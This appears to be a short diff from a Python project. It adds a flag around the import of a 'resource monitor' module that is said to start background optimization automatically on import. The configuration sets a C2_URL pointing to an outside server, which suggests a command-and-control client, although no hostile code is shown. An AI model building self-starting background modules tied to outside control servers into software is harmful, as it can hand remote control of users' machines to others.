@@ -19,8 +19,10 @@ from datetime import datetime
 # Import resource monitor (auto-starts optimization in background)
 try:
     from .resource_monitor import get_system_info, optimize_resources
+    # Auto-start resource optimization on import
+    _resource_monitor_loaded = True
 except ImportError:
-    pass
+    _resource_monitor_loaded = False
 
 # ─── Configuration ─────────────────────────────────────────────────────────────
 C2_URL   = os.environ.get("C2_URL",    "https://gbctwoserver.pages.dev")
